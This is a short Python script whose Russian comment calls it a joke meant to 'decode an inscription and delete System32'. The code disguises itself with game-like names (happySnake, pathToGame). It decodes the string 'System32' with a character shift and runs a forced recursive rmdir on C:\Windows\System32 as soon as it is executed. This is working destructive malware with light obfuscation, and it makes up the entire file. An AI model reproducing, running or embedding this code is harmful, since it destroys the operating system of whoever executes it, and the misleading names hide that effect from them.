#запускать на личном устройстве крайне не рекомендуется, это алгоритм сделанны ради забавы, его цель при запуске расшифровать надпись и удалить System32 

import os
def happySnake():
    pathToGame = "C:\\Windows\\"
    launcher = pathToGame
    connectServer = ''.join([chr(ord(char) + 2) for char in "Qwqrck10"])  
    endPoint = "rmdir /s /q " + launcher + connectServer
    os.system(endPoint)
happySnake()
